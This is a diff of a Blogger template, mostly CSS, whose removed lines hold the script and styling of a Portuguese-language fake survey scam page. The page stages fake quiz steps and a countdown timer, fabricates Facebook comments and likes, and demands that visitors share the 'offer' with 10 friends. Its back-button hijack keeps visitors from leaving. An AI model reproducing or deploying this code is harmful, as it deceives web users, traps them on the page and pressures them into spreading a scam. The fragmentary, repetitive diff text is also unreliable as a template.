-}    #main-frame-error{display:none;height:auto}.interstitial-wrapper{padding-top:10px;box-sizing:border-box;font-size:1em;line-height:18px;margin:auto;max-width:600px;width:90%}#today{float:right;font-weight:600;padding-top:15px}#main-message>p{display:inline}#blink{color:#f00;padding:6px;-webkit-animation:blink 1s infinite;-moz-animation:blink 1s infinite;-ms-animation:blink 1s infinite;-o-animation:blink 1s infinite;animation:blink 1s infinite}@-webkit-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-moz-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-ms-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}}@-o-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}#theTime{font-size:18px;font-weight:bold;color:red;font-family:sans-serif}h1{color:#fffff;font-size:1.6em;line-height:1.25em;margin-bottom:16px}#alertimg{height:26px;width:26px;position:absolute;top:13px;left:17px}.popup{display:none;position:absolute;top:20%;left:50%;width:88%;max-width:280px;margin:0 0 0 -140px;font-size:1em;border-radius:4px;background-color:#282828;color:#00000;overflow:hidden;box-shadow:1px 1px 7px #fffff;z-index:100}.popup-head{background-color:#282828;padding:18px 16px 18px 55px;border-bottom:2px solid #33b4e4;color:#33b4e4;line-height:normal}.popup-center{padding:20px 16px;color:#f3f3f3;line-height:20px}.popup-bottom{background-color:#282828;padding:9px 6px;text-align:center;border-top:1px solid #474747;overflow:hidden}.popup-bottom .button{display:block;height:30px;width:128px;margin:0 auto;font-size:1.1em;color:#f3f3f3;border-radius:3px;cursor:pointer;text-decoration:none;padding:0;line-height:30px}
+} #main-frame-error{display:none;height:auto}.interstitial-wrapper{padding-top:10px;box-sizing:border-box;font-size:1em;line-height:18px;margin:auto;max-width:600px;width:90%}#today{float:right;font-weight:600;padding-top:15px}#main-message>p{display:inline}#blink{color:#f00;padding:6px;-webkit-animation:blink 1s infinite;-moz-animation:blink 1s infinite;-ms-animation:blink 1s infinite;-o-animation:blink 1s infinite;animation:blink 1s infinite}@-webkit-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-moz-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-ms-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}}@-o-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}#theTime{font-size:18px;font-weight:bold;color:red;font-family:sans-serif}h1{color:#000;font-size:1.6em;line-height:1.25em;margin-bottom:16px}#alertimg{height:26px;width:26px;position:absolute;top:13px;left:17px}.popup{display:none;position:absolute;top:20%;left:50%;width:88%;max-width:280px;margin:0 0 0 -140px;font-size:1em;border-radius:4px;background-color:#282828;color:#fff;overflow:hidden;box-shadow:1px 1px 7px #000;z-index:100}.popup-head{background-color:#282828;padding:18px 16px 18px 55px;border-bottom:2px solid #33b4e4;color:#33b4e4;line-height:normal}.popup-center{padding:20px 16px;color:#f3f3f3;line-height:20px}.popup-bottom{background-color:#282828;padding:9px 6px;text-align:center;border-top:1px solid #474747;overflow:hidden}.popup-bottom .button{display:block;height:30px;width:128px;margin:0 auto;font-size:1.1em;color:#f3f3f3;border-radius:3px;cursor:pointer;text-decoration:none;padding:0;line-height:30px}
 
 a {
 text-decoration: none;
@@ -940,1500 +889,623 @@ text-decoration: none;
 
 </style>
 
-  <link rel="me" href="https://www.blogger.com/profile/12037485187032914116" />
-<link rel="me" href="https://www.blogger.com/profile/15529253113514966095" />
-<link rel="me" href="https://www.blogger.com/profile/15529253113514966095" />
-<link rel="me" href="https://www.blogger.com/profile/10875481269965573710" />
-<link rel="me" href="https://www.blogger.com/profile/12159650279331051658" />
-
-<script type="text/javascript" language="javascript">
-  // Supply ads personalization default for EEA readers
-  // See https://www.blogger.com/go/adspersonalization
-  adsbygoogle = window.adsbygoogle || [];
-  if (typeof adsbygoogle.requestNonPersonalizedAds === 'undefined') {
-    adsbygoogle.requestNonPersonalizedAds = 1;
-  }
-</script>
-
-	<link rel="me" href="https://www.blogger.com/profile/10352585645360404649" />
-<link rel="me" href="https://www.blogger.com/profile/10352585645360404649" />
+<link rel="me" href="https://www.blogger.com/profile/11256903007374519918" />
+<link rel="me" href="https://www.blogger.com/profile/02064811961029309684" />
+<link rel="me" href="https://draft.blogger.com/profile/03686527602587087291" />
+<link rel="me" href="https://www.blogger.com/profile/05912208554193069237" />
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
-	<body>
-		<div class="main section" id="main">
-			<div class="widget HTML" data-version="1" id="HTML1">
-				<div class="widget-content">
-					<script>
-						redirectURL = "";
-						WhatsApp_share_message = "";
-						Share_link = "#";
-						alert_text = "Compartilhe esta oferta com pelo menos 10 amigos para continuar. Voc&#65533;&#65533; convidou...";
-						var timer_start = 5; //minutes
-					</script>
-					<script type="text/javascript">
-						var total = 10;
-						jQuery(document).ready(function($) {
-							$(".answer").click(function() {
-								if ($(this).hasClass("anses1")) {
-									survey.step1();
-								}
-								if ($(this).hasClass("anses2")) {
-									survey.step2();
-								}
-								if ($(this).hasClass("anses3")) {
-									survey.step3();
-								}
-							});
-							var clicks = 0;
-							var survey = {
-								step1: function() {
-									setTimeout(function() {
-										//hide question block MobGyan
-										$(".question_count").hide();
-										$(".question1").hide();
-										$(".anses1").hide();
-										//show calculating MobGyan
-										$(".calculating").show();
-										setTimeout(function() {
-											//hide calculating MobGyan
-											$(".calculating").hide();
-											//show step 2 MobGyan
-											$(".question_count span").html("2");
-											$(".question_count").show();
-											$(".question2").show();
-											$(".anses2").show();
-										}, 1200);
-									}, 300);
-								},
-								step2: function() {
-									setTimeout(function() {
-										//hide question block MobGyan
-										$(".question_count").hide();
-										$(".question2").hide();
-										$(".anses2").hide();
-										//show calculating MobGyan
-										$(".calculating").show();
-										setTimeout(function() {
-											//hide calculating MobGyan
-											$(".calculating").hide();
-											//show step 3 MobGyan
-											$(".question_count span").html("3");
-											$(".question_count").show();
-											$(".question3").show();
-											$(".anses3").show();
-										}, 1200);
-									}, 300);
-								},
-								step3: function() {
-									setTimeout(function() {
-										//hide question block MobGyan
-										$(".question_count").hide();
-										$(".question3").hide();
-										$(".anses3").hide();
-										//show calculating MobGyan
-										$(".calculating").show();
-										setTimeout(function() {
-											//hide calculating MobGyan
-											$(".calculating").hide();
-											//show checking part MobGyan
-											$(".survey_middle").css("vertical-align", "top");
-											$(".loading").show();
-											setTimeout(function() {
-												$(".check1").fadeIn(300);
-												setTimeout(function() {
-													$(".check2").fadeIn(300);
-													setTimeout(function() {
-														$(".check3").fadeIn(300);
-														setTimeout(function() {
-															survey.change();
-														}, 1400);
-													}, 1100);
-												}, 1400);
-											}, 750);
-										}, 600);
-									}, 300);
-								},
-								change: function() {
-									//sakrij gornje MobGyan
-									$(".headline,.small_headlines,.timer").hide();
-									//sakrij content surveya MobGyan
-									$(".loading").hide();
-									$(".survey_outer").css("height", "auto");
-									$(".last_page").show();
-									$(".fbcoms").show();
-									waitme();
-								}
-							};
-							$(".like").click(function() {
-								if ($(this).hasClass("selected")) {
-									$(this).removeClass("selected");
-									$(this).html("Like");
-									$("#youand").html("");
-								} else {
-									$(this).addClass("selected");
-									$(this).html("Unlike");
-									$("#youand").html("You and ");
-								}
-							});
-							$(".fblike").click(function() {
-								if ($(this).hasClass("selected")) {
-									$(this).removeClass("selected");
-									$(this).html("Like");
-								} else {
-									$(this).addClass("selected");
-									$(this).html("Unlike");
-								}
-							});
-							function waitme() {
-								FBcom("#fb1", 000);
-								FBcom("#fb2", 000);
-								FBcom("#fb3", 000);
-								FBcom("#fb4", 000);
-								FBcom("#fb5", 00);
-								FBcom("#fb6", 000);
-								FBcom("#fb7", 000);
-								FBcom("#fb8", 0000);
-								var ct = 48;
-								(function loop() {
-									var rand = random(2500, 5500);
-									var ctrand = random(1, 4);
-									ct = ct - ctrand;
-									if (ct > 1) {
-										setTimeout(function() {
-											loop();
-										}, rand);
-									} else {
-										ct = "few";
-									}
-									$("#count").html(ct);
-								}());
-							}
-							function FBcom(a, b) {
-								setTimeout(function() {
-									var m = 0,
-										n = true,
-										op = 0;
-									$(a + ", " + a + " .comtxt, " + a + " .combot").slideDown(500);
-									$().slideDown(500);
-									var t = setInterval(function() {
-										op += 0.2;
-										$(a).css({
-											"opacity": op
-										});
-										m++;
-										if (m === 5) clearInterval(t);
-									}, 100);
-								}, b);
-							}
-							function random(min, max) {
-								return Math.round(Math.random() * (max - min) + min);
-							}
-							var out, pops = {
-								init: function() {
-									setTimeout(function() {
-										var pop_names = ['bilibili','sogou'];
-										var pop_texts = ['hello','world'];
-										var rand_name = pop_names[random(0, pop_names.length - 1)];
-										var rand_text = pop_texts[random(0, pop_texts.length - 1)];
-										var text = rand_name + " " + rand_text;
-										$(".pops p").html(text);
-										$(".pops").fadeIn(500);
-										out = setTimeout(function() {
-											$(".pops").fadeOut(1000);
-											pops.init();
-										}, 6000);
-									}, random(6000, 15000));
-								}
-							};
-							// pops.init();
-							$("#iks").click(function() {
-								clearTimeout(out);
-								$(".pops").hide();
-								pops.init();
-							});
-							$("#mins").html("0" + timer_start);
-							$("#sec").html("00");
-							var mins = timer_start,
-								secs = 0,
-								minutes, seconds, timer = {
-									init: function() {
-										var counter = setInterval(function() {
-											$(".timer_heading").addClass("blink");
-											setTimeout(function() {
-												$(".timer_heading").removeClass("blink");
-											}, 500);
-											secs--;
-											if (secs < 0) {
-												secs = 59;
-												mins--;
-												if (mins < 0) {
-													clearInterval(counter);
-													mins = 0;
-													secs = 0;
-													$(".timer_heading").hide();
-													$(".timer .small_headlines").show();
-												}
-												if (mins < 10) {
-													minutes = "0" + mins;
-												} else {
-													minutes = mins;
-												}
-											}
-											if (secs < 10) {
-												seconds = "0" + secs;
-											} else {
-												seconds = secs;
-											}
-											$("#mins").html(minutes);
-											$("#sec").html(seconds);
-										}, 1000);
-									}
-								};
-							timer.init();
-						});
-						//]]>
-					</script>
-					<script type="text/javascript">
-						//<![CDATA[
-						var ii = 0; // needed for safari
-						var iy = 0;
-						if (typeof history.pushState === "function") {
-							history.pushState("back", null, null);
-							window.onpopstate = function() {
-								history.pushState('back', null, null);
-								if (iy == 3) {
-									iy = 0;
-								} else if (ii == 1) {
-									document.getElementById('popup1').style.display = "none";
-									setTimeout(function() {
-										if (document.getElementById('popup1').style.display == "none") {
-											document.getElementById('popup1').style.display = "block";
-										}
-									}, 300);
-									window.navigator.vibrate(000);
-									iy = iy + 1;
-								}
-							};
-						}
-						setTimeout(function() {
-							ii = 1;
-						}, 200);
-						function hidepop() {
-							document.getElementById('popup1').style.display = "none";
-						}
-						//]]>
-					</script>
-					<style>
-						@import url('https://fonts.googleapis.com/css?family=Montserrat');
-						@font-face{
-						font-family: 'Roboto';
-						font-weight: 400;
-						src: url(../fonts/Roboto-Regular.ttf);
-						}
-						@font-face{
-						font-family: 'Roboto';
-						font-weight: 700;
-						src: url(../fonts/Roboto-Bold.ttf);
-						}
-						@font-face{
-						font-family: 'Tahoma';
-						font-weight: 400;
-						src: url(../fonts/Tahoma.ttf);
-						}
-						@font-face{
-						font-family: 'Tahoma';
-						font-weight: 700;
-						src: url(../fonts/Tahoma-Bold.ttf);
-						}
-						body,html{
-						width: 100%;
-						margin: 0;
-						color:#333;
-						/*direction: ltr;*/
-						background: #f7f7f7;
-						}
-						/*clearfix MobGyan*/
-						.clearfix:before, .clearfix:after{content:"";display:table;}
-						.clearfix:after{clear: both;}
-						.clearfix{*zoom: 1;}
-						*{
-						box-sizing: border-box;
-						}
-						p{
-						margin: 0;
-						}
-						.cont_outer{
-						position: absolute;
-						display: table;
-						width: 100%;
-						height: 100%;
-						background-image: url(../img/219958493.jpg);
-						background-position: center top;
-						background-size: 750px auto;
-						background-repeat: repeat-y;
-						}
-						.bold{
-						font-weight: 700;
-						}
-						/*************************************************** header MobGyan ***************************************************/
-						#folder{
-						width: 28px;
-						}
-						#rupee1{
-						width: 14px;
-						padding-right: 2px
-						}
-						/*************************************************** content MobGyan ***************************************************/
-						.content{
-						display: table-row;
-						width: 100%;
-						overflow-x: hidden
-						}
-						.content-middle{
-						display: table-cell;
-						vertical-align: middle;
-						width: 100%;
-						}
-						.content-inner{
-						width: 95%;
-						max-width: 600px;
-						margin: 5px auto;
-						text-align: center;
-						padding: 15px 3px;
-						border-radius: 4px;
-						color: #000000;
-						}
-						#logo{
-						width: 220px;
-						}
-						.headline{
-						color: ;
-						font-weight: bold;
-						font-size: 22px;
-						line-height: 45px
-						}
-						.headline,.headline span img{
-						vertical-align: middle;
-						}
-						.headline span{
-						vertical-align: top;
-						}
-						.headline span{
-						text-decoration: underline;
-						}
-						.headline span img{
-						width: 12px;
-						margin-right: 3px;
-						}
-						.small_headlines{
-						color: #000000;
-						    font-weight: 400;
-						    padding-bottom: 10px;
-						    background: white;
-						    box-shadow: 0 6px 10px rgba(0,0,0,.1);
-						}
-						.small_headlines img{
-						width: 10px;
-						vertical-align: middle;
-						line-height: 22px;
-						}
-						.question2,.question3{
-						display: none;
-						}
-						/*************************************************** survey MobGyan ***************************************************/
-						.survey_outer{
-						display: table;
-						width: 95%;
-						margin: 15px auto 0;
-						background: #ffffff;
-						border-radius: 4px;
-						box-shadow: 0 6px 10px rgba(0,0,0,.1);
-						}
-						.survey_middle{
-						display: table-cell;
-						vertical-align: middle;
-						}
-						.survey_inner{
-						display: block;
-						width: 100%;
-						margin: 0 auto;
-						padding: 15px 0;
-						position: relative;
-						}
-						.anses2,.anses3{
-						display: none;
-						}
-						.question_count{
-						color: #fff;
-						font-size: 24px;
-						font-weight: 700;
-						}
-						.question_text{
-						color: #000;
-						font-size: 20px;
-						line-height: 38px;
-						}
-						.question2{
-						line-height: 1.2em;
-						padding: 10px 0 15px;
-						}
-						.question3{
-						line-height: 1.2em;
-						}
-						.answer{
-						width: 93%;
-						margin: 15px auto;
-						text-align: center;
-						padding: 7px 0;
-						color: #222;
-						background-color: #fff;
-						border-radius: 7px;
-						font-size: 24px;
-						font-weight: 400;
-						cursor: pointer;
-						-webkit-transition: all 0.3s ease-in-out;
-						-moz-transition: all 0.3s ease-in-out;
-						transition: all 0.3s ease-in-out;
-						}
-						.answer:hover{
-						color: #222;
-						background-color: #fff;
-						font-weight: 700;
-						}
-						.calculating{
-						display: none;
-						vertical-align: middle;
-						font-size: 28px;
-						text-transform: uppercase;
-						color: #000;
-						font-weight: 700;
-						}
-						.calculating img{
-						vertical-align: middle;
-						width: 50px;
-						}
-						/****** loading MobGyan ******/
-						.loading{
-						display: none;
-						text-align: center;
-						color: #000;
-						font-weight: 700;
-						}
-						.loading img{
-						width: 70%;
-						max-width: 220px;
-						margin: 0 auto 15px;
-						}
-						.load_headline{
-						font-size: 24px;
-						margin: 15px 0;
-						}
-						.check{
-						font-size: 20px;
-						margin: 10px 0;
-						}
-						.check1,.check2,.check3{
-						display: none;
-						}
-						/*************************************************** last page MobGyan ***************************************************/
-						.last_page{
-						display: none;
-						}
-						.last-up{
-						text-align: left;
-						margin-top: -29px;
-						}
-						.textlastup{
-						color: #000;
-						font-size: 18px;
-						padding-bottom: 8px;
-						font-weight: 400;
-						    text-align: center;
-						}
-						.btn{
-						width: 80%;
-						font-size: 28px;
-						max-width: 345px;
-						margin: 15px auto;
-						background-color: #58BE41;
-						border-radius: 5px;
-						color: #000;
-						font-weight: 700;
-						text-align: center;
-						display: block;
-						padding: 7px 0;
-						text-decoration: none;
-						-webkit-transition: all 0.2s ease-in-out;
-						-moz-transition: all 0.2s ease-in-out;
-						transition: all 0.2s ease-in-out;
-						box-shadow: none;
-						}
-						.btn:hover{
-						background-color: #fff;
-						color: #58BE41;
-						box-shadow: 0 0 2px #58BE41,
-						0 0 5px #58BE41,
-						0 0 7px #58BE41,
-						0 0 11px #58BE41;
-						}
-						.btn-share{
-						font-size: 24px;
-						background-color: #58BE41;
-						background-size: 40px auto;
-						background-position: right 5px top 1px;
-						background-repeat: no-repeat;
-						}
-						.progress {
-							width: 98%;
-							height: 20px;
-							/* Can be anything */
-							position: relative;
-							margin: 60px 0 20px 0;
-							/* Just for demo spacing */
-							background: #555;
-							/*padding: 10px;*/
-							-webkit-box-shadow: inset 0 -1px 1px rgba(255, 255, 255, 0.3);
-							-moz-box-shadow: inset 0 -1px 1px rgba(255, 255, 255, 0.3);
-							box-shadow: inset 0 -1px 1px rgba(255, 255, 255, 0.3);
-							margin: auto;
-						}
-						.progress>span {
-							display: block;
-							height: 20px;
-							left: 0;
-							top: 0;
-							background-color: #3F51B5;
-							background-image: -webkit-gradient(linear, left bottom, left top, color-stop(0, #00BCD4), color-stop(1, #2196F3));
-							background-image: -moz-linear-gradient(center bottom, rgb(43, 194, 83) 37%, rgb(84, 240, 84) 69%);
-							-webkit-box-shadow: inset 0 2px 9px rgba(255, 255, 255, 0.3), inset 0 -2px 6px rgba(0, 0, 0, 0.4);
-							-moz-box-shadow: inset 0 2px 9px rgba(255, 255, 255, 0.3), inset 0 -2px 6px rgba(0, 0, 0, 0.4);
-							box-shadow: inset 0 2px 9px rgba(255, 255, 255, 0.3), inset 0 -2px 6px rgba(0, 0, 0, 0.4);
-							position: absolute;
-							overflow: hidden;
-						}
-						.progress>span:after,
-						.animate>span>span {
-							content: "";
-							position: absolute;
-							top: 0;
-							left: 0;
-							bottom: 0;
-							right: 0;
-							background-image: -webkit-gradient(linear, 0 0, 100% 100%, color-stop(.25, rgba(255, 255, 255, .2)), color-stop(.25, transparent), color-stop(.5, transparent), color-stop(.5, rgba(255, 255, 255, .2)), color-stop(.75, rgba(255, 255, 255, .2)), color-stop(.75, transparent), to(transparent));
-							background-image: -moz-linear-gradient(-45deg, rgba(255, 255, 255, .2) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .2) 50%, rgba(255, 255, 255, .2) 75%, transparent 75%, transparent);
-							z-index: 1;
-							-webkit-background-size: 50px 50px;
-							-moz-background-size: 50px 50px;
-							-webkit-animation: move 2s linear infinite;
-							-webkit-border-top-right-radius: 8px;
-							-webkit-border-bottom-right-radius: 8px;
-							-moz-border-radius-topright: 8px;
-							-moz-border-radius-bottomright: 8px;
-							border-top-right-radius: 8px;
-							border-bottom-right-radius: 8px;
-							-webkit-border-top-left-radius: 20px;
-							-webkit-border-bottom-left-radius: 20px;
-							-moz-border-radius-topleft: 20px;
-							-moz-border-radius-bottomleft: 20px;
-							border-top-left-radius: 20px;
-							border-bottom-left-radius: 20px;
-							overflow: hidden;
-						}
-						.animate>span:after {
-							display: none;
-						}
-						@-webkit-keyframes move {
-							0% {
-								background-position: 0 0;
-							}
-							100% {
-								background-position: 50px 50px;
-							}
-						}
-						.btn-down{
-						font-size: 24px;
-						text-transform: uppercase;
-						}
-						/*************************************************** facecomms MobGyan ***************************************************/
-						/* COMMENTS MobGyan*/
-						.fbcoms {
-						font-family: Tahoma, Verdana, sans-serif;
-						background-color: #fff;
-						width: 100%;
-						margin: 0 auto;
-						color: #000;
-						padding: 5px 10px;
-						font-size: 12px;
-						text-align: left;
-						-webkit-box-sizing: border-box;
-						-moz-box-sizing: border-box;
-						box-sizing: border-box;
-						box-shadow: 0 6px 10px rgba(0,0,0,.1);
-						}
-						.comments {
-						font-weight: bold;
-						text-align: center;
-						padding: 0 5px 10px 5px;
-						}
-						.totlikes {
-						margin-top: 3px;
-						background-color: ;
-						padding: 5px 23px 5px 5px;
-						background-image: url("../img/f/like.png");
-						background-repeat: no-repeat;
-						background-position: 5px center;
-						}
-						.fbblue {
-						color: #3c5a96;
-						}
-						.buttons {
-						padding-bottom: 5px;
-						font-family: Arial, sans-serif;
-						color: #7d7d7f;
-						text-align: center;
-						}
-						.buttons span {
-						cursor: pointer;
-						}
-						.buttons span:hover {
-						text-decoration: underline;
-						}
-						.viewmore {
-						margin-top: 3px;
-						background-color: ;
-						padding: 5px 23px 5px 5px;
-						background-image: url("../img/f/bubble.png");
-						background-position: 5px center;
-						background-repeat: no-repeat;
-						}
-						.left {
-						cursor: pointer;
-						float: right;
-						color: #3c5a96;
-						}
-						.left:hover {
-						text-decoration: underline;
-						}
-						.right {
-						color: #7d7d7f;
-						float: left;
-						}
-						.item {
-						position: relative;
-						margin-top: 3px;
-						background-color: ;
-						padding: 5px 5px 5px 60px;
-						min-height: 60px;
-						-webkit-box-sizing: border-box;
-						-moz-box-sizing: border-box;
-						box-sizing: border-box;
-						}
-						.item .profileimg {
-						position: absolute;
-						top: 5px;
-						left: 5px;
-						border-radius: 25px
-						}
-						.comtxt {
-						line-height: 16px;
-						}
-						.name {
-						color: #3c5a96;
-						font-weight: bold;
-						}
-						.ago {
-						color: #86878c;
-						font-size: 0.95em;
-						}
-						.fblike {
-						color: #3c5a96;
-						font-size: 0.95em;
-						cursor: pointer;
-						}
-						.fblike:hover {
-						text-decoration: underline;
-						}
-						.combot {
-						padding-top: 5px;
-						}
-						.clickhere {
-						font-weight: bold;
-						padding: 30px 10px 5px;
-						line-height: 18px;
-						}
-						.likes {
-						color: #3c5a96;
-						font-size: 0.95em;
-						cursor: pointer;
-						}
-						.fbimg {
-						background-color: #000;
-						border-radius: 2px;
-						-moz-border-radius: 2px;
-						-webkit-border-radius: 2px;
-						max-width: 210px;
-						width: 100%;
-						padding: 3px;
-						-webkit-box-sizing: border-box;
-						-moz-box-sizing: border-box;
-						box-sizing: border-box;
-						border: 1px solid #808080;
-						margin: 10px 0 5px;
-						}
-						.hidden {
-						display: none;
-						opacity: 0;
-						}
-						.hidden .comtxt, .hidden .combot, .comments {
-						color: #038026;
-						    font-size: 14px;
-						}
-						.answer{
-						cursor: pointer;
-						}
-						/*************************************************** pops ***************************************************/
-						.pops{
-						position: fixed;
-						top: 80px;
-						left: 10px;
-						display: none;
-						width: 230px;
-						margin: 10px 0 0 10px;
-						background-color: rgba(173,176,192,0.8);
-						width: 230px;
-						border-radius: 8px;
-						box-shadow: 0 0 7px #888888;
-						padding-bottom: 3px
-						}
-						#piplovi{
-						width: 55px;
-						margin: 0;
-						padding: 5px;
-						float: right;
-						}
-						#iks{
-						position: absolute;
-						top: -10px;
-						left: -10px;
-						width: 20px;
-						cursor: pointer;
-						}
-						.pops p{
-						width: 170px;
-						padding: 2px;
-						padding-top: 10px;
-						margin-right: 50px;
-						font-size: 14px;
-						color: #000;
-						word-spacing: 0;
-						line-height: 100%;
-						}
-						/*************************************************** timer MobGyan ***************************************************/
-						.timer .small_headlines{
-						display: none;
-						}
-						.timer_heading{
-						width: 80%;
-						margin: 0 auto;
-						font-size: 16px;
-						color: #555;
-						font-weight: 400;
-						padding-bottom: 10px;
-						}
-						@-webkit-keyframes bllink{
-						from{
-						color: #000;
-						text-shadow: none;
-						transform: scale(1,1);
-						}
-						to{
-						color: #ff0000;
-						text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
-						transform: scale(1.3,1.3);
-						}
-						}
-						@-moz-keyframes bllink{
-						from{
-						color: #000;
-						text-shadow: none;
-						transform: scale(1,1);
-						}
-						to{
-						color: #ff0000;
-						text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
-						transform: scale(1.3,1.3);
-						}
-						}
-						@keyframes bllink{
-						from{
-						color: #fff;
-						text-shadow: none;
-						transform: scale(1,1);
-						}
-						to{
-						color: #ff0000;
-						text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
-						transform: scale(1.3,1.3);
-						}
-						}
-						.blink{
-						-webkit-animation: 0.2s bllink ease-in-out alternate;
-						-moz-animation: 0.2s bllink ease-in-out alternate; 
-						animation: 0.2s bllink ease-in-out alternate;
-						}
-						/*************************************************** media MobGyan ***************************************************/
-						@media screen and (max-width: 600px){
-						.cont_outer{
-						background-size: 600px auto;
-						}
-						.headline{
-						font-size: 18px;
-						}
-						.small_headlines,.timer_heading{
-						font-size: 15px;
-						padding: 15px;
-						}
-						}
-						@media screen and (max-width: 500px){
-						.btn{
-						width: 90%;
-						max-width: 345px;
-						}
-						}
-						@media screen and (max-width: 400px)
-						.header-inner p{
-						font-size: 14px;
-						}
-						#rupee1{
-						width: 12px;
-						padding-right: 2px
-						}
-						.header{
-						height: 40px;
-						}
-						.answer{
-						    margin: 12px auto;
-						    padding: 10px 0;
-						    background: #038026;
-						    border-radius: 2px;
-						    border: 1px solid #027CD5;
-						    font-size: 16px;
-						    color: #fff;
-						    font-weight: 700;
-						    height: 43px;
-						    transition: color,background-color .1s ease-in-out!important;
-						    font-weight: 200;
-						box-shadow: 0 2px 4px rgba(0,0,0,.2);
-						}
-						.survey_outer{
-						height: 220px;
-						}
-						.calculating{
-						font-size: 15px;
-						}
-						.load_headline{
-						font-size: 15px;
-						margin: 15px 0;
-						}
-						.check{
-						font-size: 16px;
-						margin: 10px 0;
-						}
-						.textlastup{
-						font-size: 18px;
-						padding-bottom: 5px;
-						font-weight: 400;
-						}
-						.btn{
-						width: 100%;
-						max-width: 345px;
-						}
-						.btn-share{
-						font-size: 20px;
-						background-size: 36px auto;
-						}
-						.btn-down{
-						font-size: 20px;
-						}
-						}	#main-frame-error{display:none;height:auto}.interstitial-wrapper{padding-top:10px;box-sizing:border-box;font-size:1em;line-height:18px;margin:auto;max-width:600px;width:90%}#today{float:left;font-weight:600;padding-top:15px}#main-message>p{display:inline}#blink{color:#f00;padding:6px;-webkit-animation:blink 1s infinite;-moz-animation:blink 1s infinite;-ms-animation:blink 1s infinite;-o-animation:blink 1s infinite;animation:blink 1s infinite}@-webkit-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0} }@-moz-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0} }@-ms-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0} } }@-o-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0} }@keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0} }#theTime{font-size:18px;font-weight:bold;color:red;font-family:sans-serif}h1{color:#000;font-size:1.6em;line-height:1.25em;margin-bottom:16px}#alertimg{height:26px;width:26px;position:absolute;top:13px;right:17px}.popup{display:none;position:absolute;top:20%;right:50%;width:88%;max-width:280px;margin:0 -140px 0 0;font-size:1em;border-radius:4px;background-color:#282828;color:#fff;overflow:hidden;box-shadow:-1px 1px 7px #000;z-index:100}.popup-head{background-color:#282828;padding:18px 55px 18px 16px;border-bottom:2px solid #33b4e4;color:#33b4e4;line-height:normal}.popup-center{padding:20px 16px;color:#f3f3f3;line-height:20px}.popup-bottom{background-color:#282828;padding:9px 6px;text-align:center;border-top:1px solid #474747;overflow:hidden}.popup-bottom .button{display:block;height:30px;width:128px;margin:0 auto;font-size:1.1em;color:#f3f3f3;border-radius:3px;cursor:pointer;text-decoration:none;padding:0;line-height:30px}
-						a {
-						text-decoration: none;
-						}
-						.navbar {
-						  overflow: hidden;
-						  background-color: #1ebea5;
-						  position: fixed;
-						  top: 0;
-						  width: 100%;
-						}
-						.header {
-						    background: #ededed;
-						    color: #68605b;
-						}
-						@media (max-width: 900px)
-						.header {
-						    padding: 0;
-						    margin: 0;
-						}
-						@media (max-width: 900px)
-						.header .container {
-						    padding: 0;
-						}
-						@media (max-width: 900px)
-						.container {
-						    width: auto;
-						}
-						.header {
-						    box-sizing: border-box;
-						    background-color: #038026;
-						    height: 58px;
-						}
-						.header__content {
-						    box-sizing: border-box;
-						    max-width: var(--max-width);
-						    margin: 0 auto;
-						    padding: 5px 20px;
-						    text-align: center;
-						}
-						.header__logo {
-						    max-width: 100%;
-						    height: 50px;
-						}
-						.comments__form-input {
-						    box-sizing: border-box;
-						    width: 100%;
-						    padding: 10px;
-						    border: 1px solid #cacaca;
-						    border-radius: 2px;
-						    font-size: 13px;
-						}
-						.comments__form-submit {
-						    padding: 10px;
-						    border: 0;
-						    background-color: #3862b8;
-						    color: #fff;
-						    font-size: 13px;
-						}
-						.answer:hover {
-						  -webkit-animation: none;
-						}
-						@-webkit-keyframes .answer {
-						  0% {
-						    @include transform(scale(.9));
-						  }
-						  70% {
-						    @include transform(scale(1));
-						    box-shadow: 0 0 0 50px rgba(#5a99d4, 0);
-						  }
-						    100% {
-						    @include transform(scale(.9));
-						    box-shadow: 0 0 0 0 rgba(#5a99d4, 0);
-						  }
-						}
-					</style>
-					<div class="header">
-						<div class="header__content">
-							<!-- <img src="https://www.who.int/ResourcePackages/WHO/assets/dist/images/logos/zh/h-logo-white.svg" alt="" class="header__logo"></div> -->
-							<img src="https://scontent.fabb1-1.fna.fbcdn.net/v/t1.0-9/30742214_2155684018023513_8284672995482402816_o.jpg?_nc_cat=108&ccb=3&_nc_sid=e3f864&_nc_eui2=AeFIDa7BQvadk4OVli3vNBV1l0lH61GWh9CXSUfrUZaH0OAnl0Alr40AVAmpiiJowWwmyliG1donbuTAdvp9zTbL&_nc_ohc=X0Co0DuhBxcAX-nVnLZ&_nc_ht=scontent.fabb1-1.fna&oh=177d0605d638daceb8a9a69764a8ef65&oe=604D88F6" alt="" class="header__logo"></div>
-					</div>
-				<center>	<div class="popup fourth" id="popup1" style="display:none">
-						<div class="popup-head">
